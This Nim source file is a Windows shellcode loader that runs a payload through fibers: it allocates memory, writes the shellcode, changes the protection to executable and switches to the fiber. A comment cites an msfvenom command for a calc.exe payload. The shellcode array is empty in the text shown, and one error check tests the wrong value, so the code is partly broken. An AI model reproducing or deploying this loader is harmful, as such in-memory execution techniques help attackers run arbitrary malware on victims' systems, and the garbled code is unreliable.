import winim/lean

#[

Shellcode execution using fibers.
Steps :
1. Convert the current thread to a fiber.
2. Allocate memory in the current process as RW.
3. Write shellcode to the allocated memory.
4. Create a fiber.
5. Change memory protection to RX.
6. Switch to the fiber to execute the shellcode.

]#

# msfvenom -p windows/x64/exec CMD=calc.exe -f nim
var sc: array[276, byte] = [
byte ]

proc main(): void = 
    var fiber: LPVOID = ConvertThreadToFiber(nil)
    if fiber == nil:
        echo "Failed to convert thread to fiber"
        echo GetLastError()
        quit(1)
    echo "Fiber: ", fiber.repr

    var allocatedMemory: LPVOID = VirtualAlloc(nil, sc.len, MEM_COMMIT or MEM_RESERVE, PAGE_READWRITE)
    if allocatedMemory == nil:
        echo "Failed to allocate memory"
        echo GetLastError()
        quit(1)
    echo "allocatedMemory: ", allocatedMemory.repr

    var bytesWritten: SIZE_T
    WriteProcessMemory(GetCurrentProcess(), allocatedMemory, cast[LPVOID](addr sc), sc.len, addr bytesWritten)
    if bytesWritten != sc.len:
        echo "Failed to write shellcode to allocated memory"
        echo GetLastError()
        quit(1)
    echo "Bytes written: ", bytesWritten

    fiber = CreateFiber(0, cast[LPFIBER_START_ROUTINE](allocatedMemory), nil)
    if fiber == nil:
        echo "Failed to create fiber"
        echo GetLastError()
        quit(1)
    echo "Fiber: ", fiber.repr

    var oldProtect: DWORD
    VirtualProtect(allocatedMemory, sc.len, PAGE_EXECUTE_READ, addr oldProtect)
    if bytesWritten != sc.len:
        echo "Failed to change memory protection"
        echo GetLastError()
        quit(1)
    echo "Memory protection changed"

    SwitchToFiber(fiber)

when isMainModule:
    main()